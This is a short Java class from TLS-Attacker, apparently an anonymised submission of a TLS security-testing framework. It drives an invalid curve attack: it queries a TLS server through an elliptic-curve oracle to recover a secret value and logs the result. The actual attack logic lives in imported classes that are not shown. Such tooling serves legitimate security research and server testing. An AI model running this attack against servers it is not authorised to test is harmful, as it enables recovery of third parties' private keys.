/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.impl;

import anonymous.tlsattacker.attacks.config.InvalidCurveAttackFullCommandConfig;
import anonymous.tlsattacker.attacks.ec.ICEAttacker;
import anonymous.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
import anonymous.tlsattacker.tls.Attacker;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.crypto.ec.Curve;
import anonymous.tlsattacker.tls.crypto.ec.CurveFactory;
import anonymous.tlsattacker.tls.exceptions.ConfigurationException;
import anonymous.tlsattacker.tls.util.LogLevel;
import java.math.BigInteger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 
 * @author anonymous anonymous <anonymous.anonymous@anonymous>
 */
public class InvalidCurveAttackFull extends Attacker<InvalidCurveAttackFullCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttackFull.class);

    public InvalidCurveAttackFull(InvalidCurveAttackFullCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	if (config.getNamedCurves().size() > 1) {
	    throw new ConfigurationException("Please specify only one named curve which should be attacked");
	}

	LOGGER.info("Executing attack against the server with named curve {}", config.getNamedCurves().get(0));

	Curve curve = CurveFactory.getNamedCurve(config.getNamedCurves().get(0).name());
	RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(config, curve);
	ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations());
	attacker.attack();
	BigInteger result = attacker.getResult();

	LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Result found: {}", result);
    }

}
